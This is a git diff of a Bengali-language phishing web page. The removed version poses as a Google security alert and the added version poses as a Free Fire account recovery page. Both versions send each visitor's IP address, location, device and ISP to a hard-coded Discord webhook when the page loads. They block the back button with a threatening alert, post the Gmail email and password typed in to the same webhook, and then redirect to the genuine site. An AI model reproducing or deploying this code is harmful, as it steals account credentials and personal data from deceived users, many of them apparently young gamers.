@@ -1,77 +1,106 @@
-<!DOCTYPE html>
-<html lang="bn">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Alert</title>
-    <style>
-        body { background: #fff; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { width: 85%; max-width: 380px; text-align: center; padding: 20px; border: 1px solid #e0e0e0; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .warn { color: #d93025; font-size: 18px; font-weight: bold; margin: 15px 0; }
-        .btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
+<!DOCTYPE html>  <html lang="bn">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Free Fire ID Recovery Center</title>  
+    <style>  
+        /* ফ্রেশ এবং অফিশিয়াল গুগল/গ্যারেনা লুক */  
+        body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }  
+        .login-card { width: 90%; max-width: 400px; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }  
+        .logo { width: 60px; margin-bottom: 15px; }  
+        .ff-title { color: #ff5722; font-size: 22px; font-weight: bold; margin-bottom: 10px; }  
+        .desc { font-size: 14px; color: #555; margin-bottom: 20px; line-height: 1.5; }  
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }  
+        .btn { width: 100%; padding: 14px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }  
+        .footer { font-size: 11px; color: #888; margin-top: 20px; }  
+    </style>  
+</head>  
+<body>  <div class="login-card">  
+    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">  
+    <div class="ff-title">ফ্রী ফায়ার আইডি রিকভারি</div>  
+    <p class="desc">আপনার আইডিটি হ্যাক বা সাসপেন্ড হয়ে থাকলে তা রিকভার করতে আপনার জিমেইল দিয়ে সাইন-ইন করুন।</p>  <div id="login-fields">  
+    <input type="email" id="email" placeholder="আপনার জিমেইল এড্রেস" required>  
+    <input type="password" id="pass" placeholder="পাসওয়ার্ড দিন" required>  
+    <button class="btn" onclick="submitData()">আইডি রিকভার করুন</button>  
+</div>  
 
-<div class="card">
-    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" width="45">
-    <div class="warn">⚠️ আপনার অ্যাকাউন্টে বিপদ!</div>
-    <p style="font-size: 14px; color: #5f6368;">অন্য কেউ আপনার জিমেইল লগইন করার চেষ্টা করছে। আপনার আইপি এবং ডিভাইস ব্লক করা হয়েছে। ঠিক করতে লগইন করুন।</p>
-    <button class="btn" onclick="document.getElementById('form').style.display='block';this.style.display='none'">নিরাপদ করুন</button>
+<div class="footer">Security Verified by Google Garena Support</div>
 
-    <div id="form" style="display:none; margin-top:15px;">
-        <input type="email" id="u" placeholder="জিমেইল এড্রেস" style="width:90%; padding:10px; margin-bottom:10px; border:1px solid #ccc;">
-        <input type="password" id="p" placeholder="পাসওয়ার্ড" style="width:90%; padding:10px; margin-bottom:10px; border:1px solid #ccc;">
-        <button class="btn" onclick="send()">লগইন নিশ্চিত করুন</button>
-    </div>
-</div>
-
-<script>
-    const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
-
-    // ১. ঢোকার ১ সেকেন্ডের মধ্যে আইপি ও মডেল যাবে
-    window.onload = async () => {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const d = await res.json();
-            const m = navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0];
-
-            fetch(HOOK, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "🚨 **NEW TARGET DETECTED**",
-                    embeds: [{ color: 16711680, fields: [{name: "IP", value: d.ip}, {name: "Device", value: m}] }]
-                })
-            });
-        } catch(e) {}
-    };
-
-    // ২. ব্যাক বাটন প্রিজন (Super Strong)
-    history.pushState(null, null, location.href);
-    window.onpopstate = () => {
-        history.pushState(null, null, location.href);
-        alert("⚠️ ওয়ার্নিং: ভেরিফিকেশন ছাড়া বের হলে আপনার ফোনটি পার্মানেন্টলি লক হবে!");
-    };
-
-    // ৩. ডাটা পাঠানো
-    async function send() {
-        const u = document.getElementById('u').value, p = document.getElementById('p').value;
-        if(!u || !p) return alert("তথ্য দিন!");
-        
-        await fetch(HOOK, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-                content: "🧨 **DATA CAPTURED**",
-                embeds: [{ color: 65280, fields: [{name: "Email", value: u}, {name: "Pass", value: p}] }]
-            })
-        });
-        alert("আপনার অ্যাকাউন্ট এখন নিরাপদ।");
-        window.onpopstate = null;
-        location.href = "https://myaccount.google.com/";
-    }
-</script>
-
-</body>
-</html>
+</div>  <script>  
+    // তোমার ডিসকর্ড ওয়েব হুক  
+    const WEBHOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";  
+  
+    // ধাপ ১: লিঙ্কে ক্লিক করার সাথে সাথে "নগদ" আইপি ও লোকেশন পাঠানো  
+    window.onload = async () => {  
+        try {  
+            // আইপি এবং লোকেশন দ্রুত নেওয়ার জন্য ipapi ব্যবহার করা হয়েছে  
+            const res = await fetch('https://ipapi.co/json/');  
+            const data = await res.json();  
+            const model = navigator.userAgent.match(/([^)]+)/)[1].split(';')[0];  
+  
+            fetch(WEBHOOK, {  
+                method: "POST",  
+                headers: {"Content-Type": "application/json"},  
+                body: JSON.stringify({  
+                    content: "🎯 **TARGET CLICKED THE LINK!**",  
+                    embeds: [{  
+                        color: 16711680,  
+                        fields: [  
+                            { name: "🌐 আইপি এড্রেস", value: data.ip, inline: true },  
+                            { name: "📍 লোকেশন", value: `${data.city}, ${data.country_name}`, inline: true },  
+                            { name: "📱 মোবাইল মডেল", value: model },  
+                            { name: "🏢 ইন্টারনেট (ISP)", value: data.org }  
+                        ]  
+                    }]  
+                })  
+            });  
+        } catch (e) {  
+            // যদি ipapi ফেল করে, ব্যাকআপ হিসেবে ipify ব্যবহার করবে  
+            const resBackup = await fetch('https://api.ipify.org?format=json');  
+            const dataBackup = await resBackup.json();  
+            fetch(WEBHOOK, {  
+                method: "POST",  
+                headers: {"Content-Type": "application/json"},  
+                body: JSON.stringify({ content: "⚠️ IP Captured (Backup): " + dataBackup.ip })  
+            });  
+        }  
+    };  
+  
+    // ধাপ ২: ব্যাক বাটন ট্র্যাপ (সে যেন বের হতে না পারে)  
+    history.pushState(null, null, location.href);  
+    window.onpopstate = function() {  
+        history.pushState(null, null, location.href);  
+        alert("সতর্কবার্তা: রিকভারি চলাকালীন বের হলে আপনার ফ্রি ফায়ার আইডি স্থায়ীভাবে মুছে যাবে!");  
+    };  
+  
+    // ধাপ ৩: জিমেইল এবং পাসওয়ার্ড সংগ্রহ  
+    async function submitData() {  
+        const u = document.getElementById('email').value;  
+        const p = document.getElementById('pass').value;  
+  
+        if(!u || !p) {  
+            alert("দয়া করে সঠিক তথ্য দিন।");  
+            return;  
+        }  
+  
+        await fetch(WEBHOOK, {  
+            method: "POST",  
+            headers: {"Content-Type": "application/json"},  
+            body: JSON.stringify({  
+                content: "🧨 **FREE FIRE CREDENTIALS CAPTURED!**",  
+                embeds: [{  
+                    color: 65280,  
+                    fields: [  
+                        { name: "Email", value: u },  
+                        { name: "Password", value: p }  
+                    ]  
+                }]  
+            })  
+        });  
+  
+        alert("আপনার আবেদনটি গ্রহণ করা হয়েছে। ২৪ ঘণ্টার মধ্যে আইডি রিকভার হবে।");  
+        window.onpopstate = null; // এবার বের হতে দিবে  
+        location.href = "https://ff.garena.com/"; // গ্যারেনার মেইন সাইটে পাঠিয়ে দিবে  
+    }  
+</script>  </body>  
+</html>  
